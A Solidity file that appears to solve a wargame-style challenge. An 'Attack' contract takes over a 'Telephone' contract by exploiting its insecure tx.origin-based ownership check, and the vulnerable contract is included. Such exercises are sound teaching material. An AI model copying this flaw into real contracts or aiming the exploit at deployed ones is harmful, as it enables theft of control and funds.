// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function hack(Telephone _telephone) external {
        _telephone.changeOwner(msg.sender);
        require(_telephone.owner() == msg.sender, "Revert");
    }

    function viewMsg() public view returns (address) {
        return msg.sender;
    }
    //0xDd8a685B14b34d7932eeceC3ab9869ec267eBf7b
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
